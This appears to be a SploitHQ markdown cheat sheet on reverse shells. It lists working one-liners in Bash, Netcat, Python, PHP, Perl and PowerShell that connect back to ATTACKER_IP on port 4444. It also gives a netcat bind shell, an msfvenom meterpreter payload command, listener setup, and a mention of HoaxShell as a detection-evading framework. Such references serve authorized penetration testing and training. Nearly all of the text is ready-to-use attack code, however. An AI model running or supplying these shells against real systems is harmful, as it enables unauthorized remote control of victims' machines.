# Reverse Shells – Connect Back to Attacker for Remote Control

A **reverse shell** is a technique where a compromised system connects back to an attacker’s machine, giving remote command-line access. It’s a critical tool in penetration testing, red teaming, and post-exploitation scenarios.

🔗 [Use the Reverse Shell Generator on SploitHQ](https://sploithq.com/reverse-shells)

---

## 🎯 Why Use Reverse Shells?

- Evades inbound firewall rules (target initiates connection)
- Allows control over compromised machines
- Useful when direct inbound access (bind shell) is blocked

---

## 🧰 Common Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Netcat (Traditional)
```bash
nc ATTACKER_IP 4444 -e /bin/bash
```

### Netcat (without `-e`)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

### Python
```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

### PHP
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

### Perl
```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PowerShell (Windows)
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

---

## 🔄 Bind Shells (Alternative)

A **bind shell** opens a listening port on the target system and waits for the attacker to connect in.

### Netcat Bind Shell
```bash
nc -nlvp 4444 -e /bin/bash
```

---

## 💣 Payloads with MSFVenom

Use `msfvenom` to generate binary payloads for different platforms.

Example:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf
```

More on: [Payload Generator – SploitHQ](https://sploithq.com/payload-generator)

---

## 🦊 HoaxShell – Advanced Reverse Shell Framework

**HoaxShell** is a fully interactive PowerShell reverse shell over HTTP/HTTPS designed to evade detection.

Example setup:
```bash
python3 hoaxshell.py
```

Then execute the generated PowerShell command on the target.

🔗 [Learn More at SploitHQ](https://sploithq.com/reverse-shells)

---

## ⚠️ Notes

- Always set up a listener first:  
  ```bash
  nc -lvnp 4444
  ```

- Replace `ATTACKER_IP` with your real IP address (e.g., from a VPS or tunnel)
- Use `iptables` or `tcpdump` to debug traffic if the shell doesn’t connect

---

## 🔗 Useful Links

- [PayloadsAllTheThings – Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [SploitHQ Reverse Shell Generator](https://sploithq.com/reverse-shells)

---

## 📄 License

This content is maintained by [SploitHQ](https://sploithq.com) for educational and authorized penetration testing use only.
